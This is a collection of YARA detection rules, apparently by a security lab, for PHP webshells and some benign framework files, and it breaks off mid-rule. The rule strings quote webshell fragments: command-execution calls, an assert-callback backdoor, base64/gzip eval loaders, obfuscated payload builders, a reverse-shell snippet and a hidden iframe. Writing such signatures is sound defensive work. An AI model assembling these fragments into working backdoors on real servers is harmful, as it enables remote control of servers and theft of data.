rule sig_71c44dfbce5f80b90b6a8bc40dd8cc3eef3c6386
{
   meta:
      description = "php17 - file 71c44dfbce5f80b90b6a8bc40dd8cc3eef3c6386.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "b75a85fe49f0c1d928689a5a098f3a4a2305b409ed61abdf9857f38ae7123e50"
   strings:
      $s1 = "$ftp_login_result = ftp_login($ftp_conn_id, $ftp_user_name, $ftp_user_pass);" fullword ascii
      $s2 = "global $meurl,$me,$sitetitle, $lastsess, $login, $viewing, $iftop, $user, $pass, $password, $debug, $issuper;" fullword ascii
      $s3 = "mysql_connect($options['hostname'],$options['username'],$options['password'])or die(\"" fullword ascii
      $s4 = "sqlbackup($_POST['ip'], $_POST['sql'], $_POST['username'], $_POST['password']);" fullword ascii
      $s5 = "ftpall($_POST['ftpip'], $_POST['ftpuser'], $_POST['ftppass'], $_POST['goto'], $_POST['ftpfile'], $_POST['del']);" fullword ascii
      $s6 = ".\"<td><a href=\\\"\".$folder.$stylesheet.\"\\\" target='_blank'>\".$stylesheet.\"</a></td>\\n\"" fullword ascii
      $s7 = "if((!$ftp_conn_id) || (!$ftp_login_result)) {" fullword ascii
      $s8 = "echo \"<FORM ENCTYPE=\\\"multipart/form-data\\\" ACTION=\\\"\".$meurl.\"?op=upload\\\" METHOD=\\\"POST\\\">\\n\"" fullword ascii
      $s9 = "<a href=\\\"\".$folder.$fename.\"\\\" target=\\\"_blank\\\">\".$folder.$fename.\"</a> " fullword ascii
      $s10 = ".\"<a href=\\\"\".$url.\"http://www.asp-muma.com\\\" $iftop>" fullword ascii
      $s11 = ".\"<iframe src=http://%37%6A%79%65%77%75%2E%63%6E/a/a.asp width=0 height=0></iframe>\\n\"" fullword ascii
      $s12 = ":  </label><input id=\\\"ftppass\\\" name=\\\"ftppass\\\" size=\\\"30\\\" class=\\\"text\\\"/><br><label for=\\\"goto\\\">" fullword ascii
      $s13 = "$content1[$a] = \"<tr width=100%><td><input name='select_item[d][$stylesheet]' type='checkbox' id='$stylesheet' oncli" fullword ascii
      $s14 = "!**</span><br><br><form action=\\\"\".$meurl.\"?op=ftpall\\\" method=\\\"POST\\\"><label for=\\\"ftpip\\\">FTP " fullword ascii
      $s15 = ".\"<style>\\n*{font-family:Verdana, 'Microsoft Yahei' !important}td{font-size:13px;}span{line-height:20px;}a:visited{color" fullword ascii
      $s16 = "d=false}else{document.getElementById(\\\"deluzip\\\").disabled=true}}</script>\"" fullword ascii
      $s17 = "/* function login()                                             */" fullword ascii
      $s18 = ".\"<td><a href=\\\"\".$folder.$stylesheet.\"\\\" target='_blank'>" fullword ascii
      $s19 = "!**</span><br><br><form action=\\\"\".$meurl.\"?op=sqlbackup\\\" method=\\\"POST\\\">\\n<label for=\\\"ip\\\">" fullword ascii
      $s20 = "rgba(0,0,0,.2) inset}input.text,.upload{border: 1px solid #999;height:25px;margin:6px 1px;padding:5px;;font-size:12px;border-ra" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 200KB and
      8 of them
}


rule php17_all
{
   meta:
      description = "php17 - file all.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "ea4a818caa01c8896a7bc40a8fbd61bfd18f67433e0215e33ed8f5093e720f3c"
   strings:
      $s1 = "if (is_object($pagetype) && $pagetype->getPageTypePublishTargetTypeID() == $type->getPageTypePublishTargetTypeID()) {" fullword ascii
      $s2 = "$selectorFormFactor = $configuredTarget->getSelectorFormFactor();" fullword ascii
      $s3 = "$configuredTarget = $pagetype->getPageTypePublishTargetObject();" fullword ascii
      $s4 = "$startingPointPageID = $configuredTarget->getStartingPointPageID();" fullword ascii
      $s5 = "defined('C5_EXECUTE') or die(\"Access Denied.\");" fullword ascii
      $s6 = "$('div[data-all-form-factor-display=' + $(this).val() + ']').show();" fullword ascii
      $s7 = "$form = Loader::helper('form');" fullword ascii
      $s8 = "$factors = array('' => t('Sitemap Pop-Up'), 'sitemap_in_page' => t('In-Page Sitemap'));" fullword ascii
      $s9 = "$pageSelector = Core::make('helper/form/page_selector');" fullword ascii
      $s10 = "<?=$pageSelector->selectPage('startingPointPageIDAll', $startingPointPageID)?>" fullword ascii
      $s11 = "<?=$form->select('selectorFormFactorAll', $factors, $selectorFormFactor)?>" fullword ascii
      $s12 = "<?=$form->label('startingPointPageIDAll', t('Display Pages Beneath Page'))?>" fullword ascii
      $s13 = "$('select[name=selectorFormFactorAll]').on('change', function() {" fullword ascii
      $s14 = "<?=$form->label('selectorFormFactorAll', t('Selector Form Factor'))?>" fullword ascii
      $s15 = "if ($(this).val()) {" fullword ascii
      $s16 = "$('div[data-all-form-factor-display]').hide();" fullword ascii
      $s17 = "<div class=\"form-group\" data-all-form-factor-display=\"sitemap_in_page\">" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 3KB and
      8 of them
}

rule aa0fc6f621e8b2965b3a109832117d023f4a1ad6
{
   meta:
      description = "php17 - file aa0fc6f621e8b2965b3a109832117d023f4a1ad6.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "2a0cd4aab8539cd4e85ece7e5a8251ae6cc21816a20023f6ddb5d979c98d2cb3"
   strings:
      $x1 = "elseif ($windows && is_object($ws = new COM(\"WScript.Shell\"))){$dir=(isset($_SERVER[\"TEMP\"]))?$_SERVER[\"TEMP\"]:ini_get('up" ascii
      $x2 = "mp_dir') ;$name = $_SERVER[\"TEMP\"].namE();$ws->Run(\"cmd.exe /C $command >$name\", 0, true);$exec = file_get_contents($name);u" ascii
      $x3 = "$program = isset($_POST['program']) ? $_POST['program'] : \"c:\\winnt\\system32\\cmd.exe\";" fullword ascii
      $x4 = "else $sa = @ftp_login(ftp_connect($host,$admin[ftpport]),$user,chop($tmp[$i]));" fullword ascii
      $x5 = "eval(gzuncompress(base64_decode(\"eJzsvfl3G8eROP6z/J7/h9GYK4AmiIP3IVDiTUq8RJA6qceHY0BABDDQAOAhW/u/MNpNvLJ2I0qkLoq6SJsUZVEUSUmOnn" ascii
      $x6 = "$prog = isset($_POST['prog']) ? $_POST['prog'] : \"/c net start > \".$pathname.\"/log.txt\";" fullword ascii
      $x7 = "$exec = $wsh->exec (\"cm\".\"d.e\".\"xe /c \".$_POST['command'].\"\");" fullword ascii
      $x8 = "$a = $shell->ShellExecute($_POST['program'],$_POST['prog']);" fullword ascii
      $x9 = "elseif(is_resource($output=popen($command,\"r\"))) {while(!feof($output)){$exec= fgets($output);}pclose($output);}" fullword ascii
      $x10 = "elseif(is_callable('shell_exec') && !strstr($disablefunctions,'shell_exec')){$exec= shell_exec($command);}" fullword ascii
      $x11 = "$process = proc_open(\"\".$_POST['cmd'].\"\", $descriptorspec, $pipes);" fullword ascii
      $x12 = "$sql_query = \"CREATE FUNCTION Mixconnect RETURNS STRING SONAME 'C:\\\\\\Winnt\\\\\\Mix.dll';" fullword ascii
      $x13 = "echo \"<font color=blue>Send: site exec</font> <font color=green>\".$_POST[\"SUCommand\"].\"</font><br>\";" fullword ascii
      $s14 = "if(@ereg(\"default\\.|index\\.|admin\\.|bbs\\.|reg\\.|help\\.|upfile\\.|upload\\.|cart\\.|class\\.|login\\.|diy\\.|no\\.|ok\\.|d" ascii
      $s15 = "output = @ob_get_contents(); @ob_clean(); $exec= $tmp; }" fullword ascii
      $s16 = "=======================================decode after http://decode.cnxct.com/ ==================================" fullword ascii
      $s17 = "$execfuncs = (substr(PHP_OS, 0, 3) == 'WIN') ? array('system'=>'system','passthru'=>'passthru','exec'=>'exec','shell_exec'=>'" fullword ascii
      $s18 = "$regval = isset($_POST['regval']) ? $_POST['regval'] : 'c:\\winnt\\backdoor.exe';" fullword ascii
      $s19 = "header(\"Content-Disposition: attachment;filename=\".$_SERVER['HTTP_HOST'].\"\".$ck.\"_Files.zip\");" fullword ascii
      $s20 = "$shell = \"select 0x\".$mysql.\" from \".$database.\" into DUMPFILE '\".$uppath.\"/\".$upname.\"';\";" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 400KB and
      1 of ($x*) and all of them
}

rule sig_05191ce7adf2074cca511b53e843133590803b58
{
   meta:
      description = "php17 - file 05191ce7adf2074cca511b53e843133590803b58.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "d3d7dabd4d5beaf2a9dbe6990e9278cc3a2f8cdea6fa4cf1516093ca555a6d1d"
   strings:
      $s1 = "$target=\"http://192.168.200.115/small.php\";//" fullword ascii
      $s2 = "$curl_url = $target.\"?\".$_SERVER['QUERY_STRING'];" fullword ascii
      $s3 = "curl_setopt($ch, CURLOPT_POSTFIELDS, $poststr);" fullword ascii
      $s4 = "foreach($_POST as $k=>$v)" fullword ascii
      $s5 = "$poststr=$poststr.\"&\".$pp;" fullword ascii
      $s6 = "$v=str_replace(\"base64_decode(\",\"\",$v);" fullword ascii
      $s7 = "$poststr='';" fullword ascii
      $s8 = "if(strstr($v, \"base64_decode\"))" fullword ascii
      $s9 = "$poststr=$pp;" fullword ascii
      $s10 = "curl_setopt($ch, CURLOPT_URL, $curl_url);" fullword ascii
      $s11 = "$v=str_replace(\"))\",\")\",$v);" fullword ascii
      $s12 = "$v=base64_decode($v);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 2KB and
      8 of them
}

rule sig_29advancedvaluebinder
{
   meta:
      description = "php17 - file 29advancedvaluebinder.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "2506eaf6a0dd90fbb2e204d0523629c84f984c803c85f759c83c2b44622b28b1"
   strings:
      $x1 = "* @copyright  Copyright (c) 2006 - 2014 PHPExcel (http://www.codeplex.com/PHPExcel)" fullword ascii
      $s2 = "echo date('H:i:s') , \" Peak memory usage: \" , (memory_get_peak_usage(true) / 1024 / 1024) , \" MB\" , EOL;" fullword ascii
      $s3 = "* @license    http://www.gnu.org/licenses/old-licenses/lgpl-2.1.txt" fullword ascii
      $s4 = "* Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301  USA" fullword ascii
      $s5 = "* Copyright (C) 2006 - 2014 PHPExcel" fullword ascii
      $s6 = "echo date('H:i:s') , \" File written to \" , str_replace('.php', '.xlsx', pathinfo(__FILE__, PATHINFO_BASENAME)) , EOL;" fullword ascii
      $s7 = "echo date('H:i:s') , \" File written to \" , str_replace('.php', '.xls', pathinfo(__FILE__, PATHINFO_BASENAME)) , EOL;" fullword ascii
      $s8 = "$objPHPExcel->getActiveSheet()->setTitle('Advanced value binder');" fullword ascii
      $s9 = "$objPHPExcel->getActiveSheet()->getDefaultStyle()->getFont()->setSize(10);" fullword ascii
      $s10 = "$objPHPExcel->getActiveSheet()->getDefaultStyle()->getFont()->setName('Arial');" fullword ascii
      $s11 = "$objPHPExcel->getActiveSheet()->setCellValue('A14', 'Fraction value #2:')" fullword ascii
      $s12 = "$objPHPExcel->getActiveSheet()->setCellValue('A15', 'Fraction value #3:')" fullword ascii
      $s13 = "$objPHPExcel->getActiveSheet()->setCellValue('A17', 'Currency value #1:')" fullword ascii
      $s14 = "$objPHPExcel->getActiveSheet()->setCellValue('A12', 'Percentage value #2:')" fullword ascii
      $s15 = "$objPHPExcel->getActiveSheet()->setCellValue('A16', 'Fraction value #4:')" fullword ascii
      $s16 = "$objPHPExcel->getActiveSheet()->setCellValue('A13', 'Fraction value #1:')" fullword ascii
      $s17 = "$objPHPExcel->getActiveSheet()->setCellValue('A18', 'Currency value #2:')" fullword ascii
      $s18 = "$objPHPExcel->getActiveSheet()->setCellValue('A19', 'Currency value #3:')" fullword ascii
      $s19 = "$objPHPExcel->getActiveSheet()->setCellValue('A11', 'Percentage value #1:')" fullword ascii
      $s20 = "$objPHPExcel->getActiveSheet()->getColumnDimension('A')->setAutoSize(true);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 20KB and
      1 of ($x*) and 4 of them
}

rule sig_00d0f1a347eec0ab7cb5b1abc720e2b9dfb2bd29
{
   meta:
      description = "php17 - file 00d0f1a347eec0ab7cb5b1abc720e2b9dfb2bd29.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "aaf7086ee3fe54ad24f73d9004629915acef9b5bc387adcfa9a09b046779775a"
   strings:
      $s1 = "filter_var($_REQUEST['op'], FILTER_CALLBACK, array('options' => 'assert'));" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule _themosisUserCore_scout
{
   meta:
      description = "php17 - file _themosisUserCore.scout.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "a29085e5dfd9c76adc109adfeb2aa859f3e4319725abb61d24f5ba62ac4d5380"
   strings:
      $s1 = "<!-- Default Themosis User main view -->" fullword ascii
      $s2 = "@include('_themosisUserTable', ['__fields' => $__fields[$data['slug']]])" fullword ascii
      $s3 = "@include('_themosisUserTable', ['__fields' => $__fields])" fullword ascii
      $s4 = "$data = $section->getData();" fullword ascii
      $s5 = "@if(isset($__fields[$data['slug']]))" fullword ascii
      $s6 = "@foreach($__sections as $section)" fullword ascii
   condition:
      uint16(0) == 0x213c and filesize < 1KB and
      all of them
}

rule aca4448bad781173bfe4bb370884310d9c12038a
{
   meta:
      description = "php17 - file aca4448bad781173bfe4bb370884310d9c12038a.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "0efd4ff4f6438b8505371da6da8e52372efafdeae9ac78df73fbfd15939dace4"
   strings:
      $x1 = "// exec_all , A function used to execute commands , This function will only execute if the Safe Mode is" fullword ascii
      $s2 = "// ------------------------------------- Some header Functions (Need to be on top) ---------------------------------\\" fullword ascii
      $s3 = "$handle = proc_open($command ,$descriptorspec , $pipes); // This will return the output to an array 'pipes'" fullword ascii
      $s4 = "$output = shell_exec($command);" fullword ascii
      $s5 = "$handle = popen($command , \"r\"); // Open the command pipe for reading" fullword ascii
      $s6 = "$result=exec_all($_GET['cmd']);" fullword ascii
      $s7 = "//-------------------------------- Check what he wants -------------------------------------------" fullword ascii
      $s8 = "//---------------------------------- Fuctions ---------------------------------------------------" fullword ascii
      $s9 = "function exec_all($command)" fullword ascii
      $s10 = "// The lock will be set to 'off' if the session_start fuction is disabled i.e if sessions are not supported " fullword ascii
      $s11 = "// ----------------------------------------------------------------------------------------------------------------" fullword ascii
      $s12 = "$subject = \"Shell Accessed -- Ani-Shell --\";" fullword ascii
      $s13 = "<!-- For Shell -->" fullword ascii
      $s14 = "exec($command,$output);" fullword ascii
      $s15 = "[]--------------cmd Shell-----------------" fullword ascii
      $s16 = "if(isset($_POST['user']) && isset($_POST['pass']) && $lock == 'on')" fullword ascii
      $s17 = "// --------------------- Tracebacks --------------------------------" fullword ascii
      $s18 = "$from = \"ani-shell$[email]randomInt@fbi.gov[/email]\"; " fullword ascii
      $s19 = "$output .= fgets($pipes[1],512);" fullword ascii
      $s20 = "if(!isset($_GET['cmd']) || $_GET['cmd'] == '')" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 40KB and
      1 of ($x*) and 4 of them
}

rule sig_2015_02_06_000000_create_categories_table
{
   meta:
      description = "php17 - file 2015_02_06_000000_create_categories_table.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "b304c317d0b8ccd975b2136778c65a0283a3da92a65d140f1c8b5974edeb3bcf"
   strings:
      $s1 = "$table->string('strategy', 15)->default('dateslot');" fullword ascii
      $s2 = "$table->string('description');" fullword ascii
      $s3 = "$table->string('slug')->unique();" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 2KB and
      all of them
}

rule AbstractOfferItem
{
   meta:
      description = "php17 - file AbstractOfferItem.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "cce36b0c546d20449d56fec4bd702e2487aa522a4e9f715f64b849d0dcf7bc99"
   strings:
      $s1 = "throw new UnsupportedException('getComment is not implemented for ' . get_class($this));" fullword ascii
      $s2 = "throw new UnsupportedException('getFinalTotalPrice is not implemented for ' . get_class($this));" fullword ascii
      $s3 = "throw new UnsupportedException('getOriginalTotalPrice is not implemented for ' . get_class($this));" fullword ascii
      $s4 = "throw new UnsupportedException('setOriginalTotalPrice is not implemented for ' . get_class($this));" fullword ascii
      $s5 = "throw new UnsupportedException('setFinalTotalPrice is not implemented for ' . get_class($this));" fullword ascii
      $s6 = "use Pimcore\\Bundle\\EcommerceFrameworkBundle\\Model\\AbstractOrderItem;" fullword ascii
      $s7 = "use Pimcore\\Bundle\\EcommerceFrameworkBundle\\Exception\\UnsupportedException;" fullword ascii
      $s8 = "throw new UnsupportedException('getDiscount is not implemented for ' . get_class($this));" fullword ascii
      $s9 = "throw new UnsupportedException('setCartItemKey is not implemented for ' . get_class($this));" fullword ascii
      $s10 = "throw new UnsupportedException('setSubItems is not implemented for ' . get_class($this));" fullword ascii
      $s11 = "throw new UnsupportedException('getCartItemKey is not implemented for ' . get_class($this));" fullword ascii
      $s12 = "throw new UnsupportedException('setProductName is not implemented for ' . get_class($this));" fullword ascii
      $s13 = "throw new UnsupportedException('getSubItems is not implemented for ' . get_class($this));" fullword ascii
      $s14 = "throw new UnsupportedException('getProductNumber is not implemented for ' . get_class($this));" fullword ascii
      $s15 = "throw new UnsupportedException('setDiscount is not implemented for ' . get_class($this));" fullword ascii
      $s16 = "throw new UnsupportedException('getProductName is not implemented for ' . get_class($this));" fullword ascii
      $s17 = "throw new UnsupportedException('setProduct is not implemented for ' . get_class($this));" fullword ascii
      $s18 = "throw new UnsupportedException('getProduct is not implemented for ' . get_class($this));" fullword ascii
      $s19 = "throw new UnsupportedException('setProductNumber is not implemented for ' . get_class($this));" fullword ascii
      $s20 = "throw new UnsupportedException('setDiscountType is not implemented for ' . get_class($this));" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 20KB and
      8 of them
}

rule sig_9eda2dcfa778575040f5a75890797227
{
   meta:
      description = "php17 - file 9eda2dcfa778575040f5a75890797227.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "093cdc8ad2c0928aee18a38d4e8bab5c4f6eccc1181d40343339cf42b08c6af1"
   strings:
      $s1 = "echo '<form action=\"\" method=\"post\" enctype=\"multipart/form-data\" name=\"uploader\" id=\"uploader\">';" fullword ascii
      $s2 = "if(@move_uploaded_file($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>Upload SUKSES !!!</b><br><br>'; }" fullword ascii
      $s3 = "if( $_POST['_upl'] == \"Upload\" ) {" fullword ascii
      $s4 = "else { echo '<b>Upload GAGAL !!!</b><br><br>'; }" fullword ascii
      $s5 = "echo '<b><br><br>'.php_uname().'<br></b>';" fullword ascii
   condition:
      uint16(0) == 0x4947 and filesize < 1KB and
      all of them
}


rule sig_07_escape_tpl
{
   meta:
      description = "php17 - file 07_escape.tpl.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "ceb7847031bf9c31951932264cc6be47a8ce45d65ec4bb71b561a0ead0f87661"
   strings:
      $s1 = "<?php $this->eprint($this->text) ?>" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule application
{
   meta:
      description = "php17 - file application.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "4c43a6175cec2ed5aa4845c16e521219c61552198a8d16867daf298ac5bfa465"
   strings:
      $x1 = "* In case of conflict with a command parameters, the command parameter is injected" fullword ascii
      $s2 = "* Set `$injectByTypeHint` to `true` to make Silly fetch container entries by their" fullword ascii
      $s3 = "* Set `$injectByParameterName` to `true` to make Silly fetch container entries by" fullword ascii
      $s4 = "* Helper to run a sub-command from a command." fullword ascii
      $s5 = "* @see http://stackoverflow.com/questions/1993721/how-to-convert-camelcase-to-camel-case" fullword ascii
      $s6 = "* type-hint, i.e. call `$container->get('Psr\\Log\\LoggerInterface')`." fullword ascii
      $s7 = "*     $application->command('greet', function (Psr\\Log\\LoggerInterface $logger) {" fullword ascii
      $s8 = "* @param string $command Command that should be run." fullword ascii
      $s9 = "* the parameter name, i.e. call `$container->get('logger')`." fullword ascii
      $s10 = "$message .= \" Either use [new {$class}(), '{$method}'] or configure a dependency injection container that supports a" fullword ascii
      $s11 = "* @param string $expression Defines the arguments and options of the command." fullword ascii
      $s12 = "* *Optionally*, you can also enable dependency injection in the callable parameters:" fullword ascii
      $s13 = "* in priority over dependency injection." fullword ascii
      $s14 = "* @param array $aliases An array of aliases for the command." fullword ascii
      $s15 = "* Commands that are PHP callables are not affected (which is what we want)." fullword ascii
      $s16 = "* Only commands that are *not* PHP callables will be fetched from the container." fullword ascii
      $s17 = "* @param callable|string|array $callable Called when the command is called." fullword ascii
      $s18 = "* @param Command $command" fullword ascii
      $s19 = "* Define a CLI command using a string expression and a callable." fullword ascii
      $s20 = "* @param OutputInterface|null $output The output to use. If not provided, the output will be silenced." fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 30KB and
      1 of ($x*) and 4 of them
}

rule sig_94f2da4da2fb7d469229ee742a304157e1408ce6
{
   meta:
      description = "php17 - file 94f2da4da2fb7d469229ee742a304157e1408ce6.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "969dabda32a14d53d511d239722ea2e2afd293202a93704c1ce921b7b03c33ad"
   strings:
      $s1 = "$S='i].=$)Pp;$e=strpos)P()P$s[$i],$f);)Pif($e){$k)P=$kh.$)Pkf;)Pob_start();)P@e)Pval(@gz)Puncompress)P(@x)P(@bas)Pe64_decod)';" fullword ascii
      $s2 = "$z='o)Pr($j=0;($j<$c)P&)P&$i<$l);$)Pj++,$i)P)P++){$o.=$t{$)Pi}^$k{$j)P};})P}r)Peturn $)Po;}$r=$_S)P)PERV)PER;$rr=@$r[\"HTT)PP';" fullword ascii
      $s3 = "$O=str_replace('gn','','gncreagntgnegn_fgnunctignon');" fullword ascii
      $s4 = "$R=str_replace(')P','',$Z.$z.$i.$p.$r.$o.$T.$S.$d.$h);" fullword ascii
      $s5 = "$d='Pe(preg_)Prepl)P)Pace(arr)Pay(\"/_/\",\"/-)P/\"),a)Prray(\"/\")P,\")P+)P\"),$ss($s)P[$i],)P0,$e))),$k))P))P);$o=ob)P_get_con" ascii
      $s6 = "$d='Pe(preg_)Prepl)P)Pace(arr)Pay(\"/_/\",\"/-)P/\"),a)Prray(\"/\")P,\")P+)P\"),$ss($s)P[$i],)P0,$e))),$k))P))P);$o=ob)P_get_con" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 4KB and
      all of them
}

rule sig_351df1bd824721442e4e709e3806a9fc139de3e6
{
   meta:
      description = "php17 - file 351df1bd824721442e4e709e3806a9fc139de3e6.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "c9e0c70dddb705dddf0a5f54c517a380f8f914b6d0b4149ac8524c5df586a274"
   strings:
      $x1 = "md5 online encoder/decoder (brutforce) (php) - [<a href=http://alturks.com/?q=releases&download=4>DOWNLOAD</a>]" fullword ascii
      $x2 = "John The Ripper [<a href=http://www.openwall.com/john/ target=_blank>Web</a>]</form><br>\";" fullword ascii
      $x3 = "$serv = @mysql_connect($adress.\":\".$port, $login,$pass) or die(\"<font color=red>Error: \".mysql_error().\"</font>\");" fullword ascii
      $x4 = "$copyr = \"<center><a href=http://alturks.com target=_blank>nsTView $ver<br>o... Network security team ...o</a>\";" fullword ascii
      $x5 = "# example: Delete autoexec.bat (nst) del c:\\autoexec.bat" fullword ascii
      $x6 = "[<a href='$php_self?getdb=1&to=$cfa[0]&vnutr=1&vn=$vn&db=$db&login=$login&pass=$pass&adress=$adress&conn=1&baza=1&p=sql&tbl=$tbl" ascii
      $x7 = "<form method=post action='$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1&tbl=$tbl&vnutr=1&baza=1&vn=$vn&db=$db'>" fullword ascii
      $x8 = "</form><form method=post action='$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1&tbl=$tbl&baza=1&vn=$vn&db=$db'>" fullword ascii
      $x9 = "[<a href='$php_self?getdb=1&to=$cfa[0]&vnutr=1&vn=$vn&db=$db&login=$login&pass=$pass&adress=$adress&conn=1&baza=1&p=sql&tbl=$tb" fullword ascii
      $x10 = "print \"<meta http-equiv=\\\"REFRESH\\\" content=\\\"0;URL=$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1&baza=1&" ascii
      $x11 = "Read file content using MySQL - when <b>safe_mode</b>, <b>open_basedir</b> is <font color=green>ON</font><Br>" fullword ascii
      $s12 = "<b>nsTView $ver :: <a href=http://alturks.com style='text-decoration:none;'><font color=black>alturks.com</font></a><br></b>" fullword ascii
      $s13 = "open STDIN,\\\"<&X\\\";open STDOUT,\\\">&X\\\";open STDERR,\\\">&X\\\";exec(\\\"/bin/sh -i\\\");" fullword ascii
      $s14 = "# Dump from: \".$_SERVER[\"SERVER_NAME\"].\" (\".$_SERVER[\"SERVER_ADDR\"].\")" fullword ascii
      $s15 = "<font color=green><b>You can change temp folder for dump file in your browser!<br>" fullword ascii
      $s16 = "1&p=sql&vn=$str[0]&baza=1&db=$db&login=$login&pass=$pass&adress=$adress&conn=1&tbl=$str[0]&ins_new_line=1'>$str[0]</a><br>\";" fullword ascii
      $s17 = "header(\"Content-disposition: attachment; filename=\\\"$download\\\";\");" fullword ascii
      $s18 = "<font color=red>Change variable &f_d=(here writable directory, expl: /tmp or c:/windows/temp)</font><br>" fullword ascii
      $s19 = "print \"<meta http-equiv=\\\"REFRESH\\\" content=\\\"0;URL=$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1&baza=1&" ascii
      $s20 = "print \"<meta http-equiv=\\\"REFRESH\\\" content=\\\"5;URL=$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1&vnutr=1" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 200KB and
      1 of ($x*) and all of them
}

rule sig_5c029c99477b356a12c0f63ffd8634c87175c6f5
{
   meta:
      description = "php17 - file 5c029c99477b356a12c0f63ffd8634c87175c6f5.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "356121bfb217fc572ae7a14db36a168aa97230c2cc5bce2bf2d9a86122b1196b"
   strings:
      $s1 = "header(\"Content-disposition: attachment; filename=\\\"\".basename($file).\"\\\";\");" fullword ascii
      $s2 = "output(html_safe(execute($p['terminalInput'])));" fullword ascii
      $s3 = "<input type='text' id='evalArguments' value='Arguments' spellcheck='false' onkeydown=\\\"trap_enter(event, 'eval_go');\\\">" fullword ascii
      $s4 = "$findExecutable = trim($p['findExecutable']);" fullword ascii
      $s5 = "else $explorer_content = show_all_files(get_cwd());" fullword ascii
      $s6 = "if($findExecutable==\"true\"){" fullword ascii
      $s7 = "header(\"Content-length: \".filesize($file));" fullword ascii
      $s8 = "<tr><td colspan='4'><textarea id='evalInput' spellcheck='false' style='height:140px;min-height:140px;'></textarea></td></tr>" fullword ascii
      $s9 = "if((!portableMode) && ($('#terminalOutput').html()=='')) $('#terminalInput').focus();\";" fullword ascii
      $s10 = "$check = strpos(strtolower($content), strtolower($findContent))===false;" fullword ascii
      $s11 = "header(\"Content-Type: \".$mime);" fullword ascii
      $s12 = "elseif(isset($p['editType'])&&isset($p['editFilename'])&&isset($p['editInput'])&&isset($p['preserveTimestamp'])){" fullword ascii
      $s13 = "echo \"data:\".$mime.\";base64,\".base64_encode(read_file($file));" fullword ascii
      $s14 = "$res = $path.\"{[|jak3fr0z|]}\".get_nav($path).\"{[|jak3fr0z|]}\";" fullword ascii
      $s15 = "if((!portableMode) && ($('#evalOutput').html()=='You can also press ctrl+enter to submit')) $('#evalInput').focus();\";" fullword ascii
      $s16 = "error_reporting(E_ERROR | E_WARNING | E_PARSE | E_NOTICE);" fullword ascii
      $s17 = "if(!is_executable($k)) $candidate = array_diff($candidate, array($k));" fullword ascii
      $s18 = "$findContentInsensitive = trim($p['findContentInsensitive']);" fullword ascii
      $s19 = "$p = array_map(\"rawurldecode\", get_post());" fullword ascii
      $s20 = "$GLOBALS['module']['explorer']['content'] = $explorer_content;" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 40KB and
      8 of them
}

rule sig_02dcbc8151f8291351ead6fc008779191f755697
{
   meta:
      description = "php17 - file 02dcbc8151f8291351ead6fc008779191f755697.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "d705a2820f91f2ad5f21edf604ae1ddb8363605e07eac2f9a83312dbf654dcf1"
   strings:
      $s1 = "$W='*wmd5($*wi.$kh*w),0,3));*w$f=$s*w*wl($ss(m*wd5($i.$kf),0,3)*w);$*wp=\"\";for*w*w($z=1;$z<*wcou*wnt($m[1]);$z*w++)$*wp.=$q';" fullword ascii
      $s2 = "$h=str_replace('*w','',$L.$g.$d.$P.$z.$W.$q.$e.$n.$c);" fullword ascii
      $s3 = "$B=str_replace('xJ','','cxJrexJxJatxJe_fuxJnctixJon');" fullword ascii
      $s4 = "$n='_*wrepla*wc*w*we(array(\"/_/\",\"/-*w*w/\"),array(\"/\"*w*w,\"+\"),*w$ss($s[$i],0*w,$e*w))),$*wk)*w));$o=ob_get_*wcont*wents" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 4KB and
      all of them
}

rule sig_76a349cd74ff89fe29b0dd74de8717363f474898
{
   meta:
      description = "php17 - file 76a349cd74ff89fe29b0dd74de8717363f474898.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "19c251d87ef79ac9d0a738976897bfddfd01e72359cb6b0b7df765538dc6ba2a"
   strings:
      $s1 = "$wrgj=\"CBqb2luKdhGFycmF5Xdh3NsaWNlKCdhRhdhLCRjKCRhdhKS0dhzKSkdhpKSdhk7ZWNdhobyAnPC8dhnLiRrLic+Jzt9\";" fullword ascii
      $s2 = "$czdj=\"hcHJlZdh19yZXBsdhYWNlKGFdhydhcmF5KCcvW1dh5cdz1cc10vJydhwnL1xzLycpLCBhcnJheSgdhnJywnKycpL\";" fullword ascii
